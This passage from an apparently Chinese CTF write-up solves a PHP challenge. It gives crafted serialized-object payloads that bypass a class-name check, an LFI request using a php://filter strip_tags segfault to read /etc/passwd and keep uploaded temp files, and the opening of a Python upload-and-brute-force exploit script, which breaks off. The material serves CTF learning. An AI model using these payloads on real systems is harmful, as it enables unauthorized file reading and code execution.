&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;?php
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">// function.php
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">function __autoload($classname){
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> require_once &amp;#34;/var/www/html/$classname.php&amp;#34;;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">}
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>简化一下就是&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/myClass/i&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_COOKIE&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;ctfer&amp;#39;&lt;/span>&lt;span style="color:#111">])))){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Error: Class &amp;#39;myclass&amp;#39; not found &amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>很显然上下文中没有myClass这个类 二次序列化之后会直接报错，其中一种处理方式是去掉末尾的&lt;code>}&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>O:7:&amp;#34;myclass&amp;#34;:1:{s:1:&amp;#34;h&amp;#34;;O:5:&amp;#34;Hello&amp;#34;:1:{s:3:&amp;#34;qwb&amp;#34;;s:36:&amp;#34;e2a7106f1cc8bb1e1318df70aa0a3540.php&amp;#34;;}
O%3A7%3A%22myclass%22%3A1%3A%7Bs%3A1%3A%22h%22%3BO%3A5%3A%22Hello%22%3A1%3A%7Bs%3A3%3A%22qwb%22%3Bs%3A36%3A%22e2a7106f1cc8bb1e1318df70aa0a3540%2Ephp%22%3B%7D
&lt;/code>&lt;/pre>&lt;p>或者当属性为空时，属性值反序列化之后不会赋值到对象上，这样就能绕过myclass的限制（修改序列化数字元素个数）&lt;/p>
&lt;pre tabindex="0">&lt;code>O:8:&amp;#34;stdClass&amp;#34;:4:{s:0:&amp;#34;&amp;#34;;O:7:&amp;#34;myclass&amp;#34;:0:{}s:1:&amp;#34;b&amp;#34;;O:5:&amp;#34;Hello&amp;#34;:1:{s:3:&amp;#34;qwb&amp;#34;,s:36:&amp;#34;e2a7106f1cc8bb1e1318df70aa0a3540.php&amp;#34;;}}
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// e2a7106f1cc8bb1e1318df70aa0a3540.php
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">include&lt;/span> &lt;span style="color:#d88200">&amp;#34;bff139fa05ac583f685a523ab3d110a0.php&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">include&lt;/span> &lt;span style="color:#d88200">&amp;#34;45b963397aa40d4a0063e0d85e4fe7a1.php&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// bff139fa05ac583f685a523ab3d110a0.php
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">PNG&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// 处理上传的PNG图片
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">is_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#111">)){&lt;/span>&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;我从来没有见过侬&amp;#34;&lt;/span>&lt;span style="color:#111">);}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$first&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">imagecreatefrompng&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">$first&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;发现了奇怪的东西2333&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$size&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">min&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">imagesx&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$first&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#75af00">imagesy&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$first&lt;/span>&lt;span style="color:#111">));&lt;/span> &lt;span style="color:#75715e">// 以最小宽度为限切割为正方形 我们直接生成的时候就搞个正方形
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">unlink&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$second&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">imagecrop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$first&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;x&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;y&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;width&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#111">$size&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;height&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#111">$size&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$second&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#00a8c8">FALSE&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">imagepng&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$second&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">imagedestroy&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$second&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75715e">//销毁，清内存
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">imagedestroy&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$first&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 45b963397aa40d4a0063e0d85e4fe7a1.php
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">GenFiles&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$files&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$len&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">strlen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$str&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$filename&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;php&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$j&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$j&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$j&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$filename&lt;/span> &lt;span style="color:#f92672">.=&lt;/span> &lt;span style="color:#111">$str&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$len&lt;/span>&lt;span style="color:#111">)];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// file_put_contents(&amp;#39;/tmp/&amp;#39;.$filename,&amp;#39;flag{fake_flag}&amp;#39;);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$files&lt;/span>&lt;span style="color:#111">[]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$filename&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$files&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;72aa377b-3fc0-4599-8194-3afe2fc9054b&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;72aa377b-3fc0-4599-8194-3afe2fc9054b&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;404.html&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/tmp/i&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$flag&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">PNG&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">include&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// 包含那个PNG
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">scandir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;dd9bd165-7cb2-446b-bece-4d54087185e1&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;dd9bd165-7cb2-446b-bece-4d54087185e1&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>&lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;dd9bd165-7cb2-446b-bece-4d54087185e1&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">===&lt;/span>&lt;span style="color:#d88200">&amp;#39;/tmp&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$somthing&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">GenFiles&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">array_merge&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$res&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$somthing&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// /e2a7106f1cc8bb1e1318df70aa0a3540.php?72aa377b-3fc0-4599-8194-3afe2fc9054b=x&amp;amp;dd9bd165-7cb2-446b-bece-4d54087185e1=/tmp
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">shuffle&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$res&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">print_r&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$res&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>我们利用LFI via segmentfault那个技巧 | &lt;a href="https://www.jianshu.com/p/dfd049924258">LFI via SegmentFault&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>include.php?file=php://filter/string.strip_tags/resource=/etc/passwd
&lt;/code>&lt;/pre>&lt;p>&lt;code>string.strip_tags&lt;/code>可以导致php在执行过程中Segment Fault&lt;/p>
&lt;p>如果请求中同时存在一个上传文件的请求，这个文件会被保留，存储在/tmp/phpxxxxxxxxxxx（xxxxx是数字+字母的6位数），这个文件连续保存，不用竞争直接爆破（多线程上传文件，生成多个phpxxxxxxxxxxx）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -*- coding: utf-8 -*-
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">import&lt;/span> &lt;span style="color:#75af00">requests&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">import&lt;/span> &lt;span style="color:#75af00">string&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">import&lt;/span> &lt;span style="color:#75af00">itertools&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">charset&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">base_url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://eci-2ze9gh3z7jcw29alwhuz.cloudeci1.ichunqiu.com&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">def&lt;/span> &lt;span style="color:#75af00">upload_file_to_include&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">file_content&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">files&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;evil.jpg&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">file_content&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;image/jpeg&amp;#39;&lt;/span>&lt;span style="color:#111">)}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">files&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">files&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">except&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">def&lt;/span> &lt;span style="color:#75af00">generate_tmp_files&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">with&lt;/span> &lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;miao.png&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;rb&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#75af00">fin&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">file_content&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fin&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">phpinfo_url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;%s/e2a7106f1cc8bb1e1318df70aa0a3540.php?72aa377b-3fc0-4599-8194-3afe2fc9054b=php://filter/string.strip_tags/resource=passwd&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">base_url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">length&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">times&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">charset&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">**&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">length&lt;/span> &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">))&lt;/span>
